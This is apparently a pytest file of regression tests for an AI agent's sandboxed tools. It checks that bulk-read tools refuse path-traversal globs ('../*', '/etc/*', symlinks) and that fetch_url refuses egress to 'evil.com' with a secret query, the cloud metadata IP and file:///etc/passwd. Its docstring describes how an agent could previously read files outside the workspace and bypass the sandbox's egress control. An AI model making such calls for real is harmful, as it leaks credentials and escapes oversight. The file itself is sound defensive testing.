"""Regression guards for two boundary escapes found in the security audit.

F1 — the bulk-read fs tools (grep/glob/count_matches) fed the agent-controlled
     glob straight into ``root.glob(pattern)`` with no containment check, so a
     ``../*`` pattern (or a planted symlink) read files outside the workspace.
F4 — ``fetch_url`` made in-process httpx calls that the srt sandbox (which only
     wraps bash) never saw, so egress was unbounded even under an allowlist.

Both are now blocks, not observations. These tests fail loudly if either
regresses.
"""
from __future__ import annotations

from boundary.tools.fs import register_fs_tools
from boundary.tools.registry import ToolRegistry
from boundary.tools.web import _host_allowed, register_web_tools
from boundary.tools.workspace import Workspace

# --- F1: read-jail on the bulk-read tools -------------------------------------


def _fs(tmp_path):
    ws = Workspace(tmp_path / "ws")
    reg = ToolRegistry()
    register_fs_tools(reg, ws)
    return ws, reg


def test_grep_refuses_parent_escape_and_does_not_leak(tmp_path):
    (tmp_path / "secret.txt").write_text("API_KEY=sk-leak", encoding="utf-8")
    ws, reg = _fs(tmp_path)
    out = reg.get("grep").fn(pattern="API_KEY", glob="../*")
    assert out.startswith("ERROR:")
    assert "sk-leak" not in out


def test_glob_refuses_parent_escape(tmp_path):
    (tmp_path / "secret.txt").write_text("x", encoding="utf-8")
    ws, reg = _fs(tmp_path)
    out = reg.get("glob").fn(pattern="../*")
    assert out.startswith("ERROR:")
    assert "secret.txt" not in out


def test_count_matches_refuses_parent_escape(tmp_path):
    (tmp_path / "secret.txt").write_text("API_KEY=sk-leak", encoding="utf-8")
    ws, reg = _fs(tmp_path)
    out = reg.get("count_matches").fn(pattern="API_KEY", glob="../*")
    assert out.startswith("ERROR:")


def test_absolute_glob_is_refused(tmp_path):
    ws, reg = _fs(tmp_path)
    assert reg.get("glob").fn(pattern="/etc/*").startswith("ERROR:")


def test_symlink_out_of_workspace_is_dropped(tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "passwd").write_text("root:x:0:0", encoding="utf-8")
    ws, reg = _fs(tmp_path)
    (ws.root / "escape").symlink_to(outside)
    out = reg.get("grep").fn(pattern="root", glob="escape/*")
    assert "root:x:0:0" not in out
    assert "files_scanned=0" in out


def test_in_workspace_glob_still_works(tmp_path):
    ws, reg = _fs(tmp_path)
    (ws.root / "a").mkdir()
    (ws.root / "a" / "note.txt").write_text("API_KEY=inside", encoding="utf-8")
    assert reg.get("glob").fn(pattern="**/*.txt") == "a/note.txt"
    assert "files_matched=1" in reg.get("grep").fn(pattern="API_KEY", glob="**/*")


def test_workspace_safe_glob_helpers(tmp_path):
    ws = Workspace(tmp_path / "ws")
    assert Workspace.glob_escapes("../x") is True
    assert Workspace.glob_escapes("/etc/x") is True
    assert Workspace.glob_escapes("**/*.py") is False
    assert ws.contains(ws.root / "a.txt") is True
    assert ws.contains(tmp_path / "outside.txt") is False


# --- F4: egress allowlist enforced in-process for fetch_url -------------------


def test_host_allowed_exact_and_subdomain():
    al = ["example.com"]
    assert _host_allowed("example.com", al)
    assert _host_allowed("api.example.com", al)
    assert not _host_allowed("evil.com", al)
    # suffix must be on a dot boundary — no false match
    assert not _host_allowed("notexample.com", al)


def _web(allowlist, enforce=True):
    reg = ToolRegistry()
    register_web_tools(reg, egress_allowlist=allowlist, enforce_egress=enforce)
    return reg.get("fetch_url").fn


def test_fetch_url_blocks_off_allowlist_host():
    out = _web(["example.com"])(url="http://evil.com/?d=secret", reason="x")
    assert out.startswith("ERROR: egress refused")
    assert "evil.com" in out


def test_fetch_url_blocks_metadata_ip():
    out = _web(["example.com"])(
        url="http://169.254.169.254/latest/meta-data/", reason="x"
    )
    assert out.startswith("ERROR: egress refused")


def test_fetch_url_blocks_non_http_scheme():
    out = _web(["example.com"])(url="file:///etc/passwd", reason="x")
    assert out.startswith("ERROR: egress refused")


def test_fetch_url_empty_allowlist_fails_closed():
    out = _web([])(url="http://example.com/", reason="x")
    assert out.startswith("ERROR: egress refused")
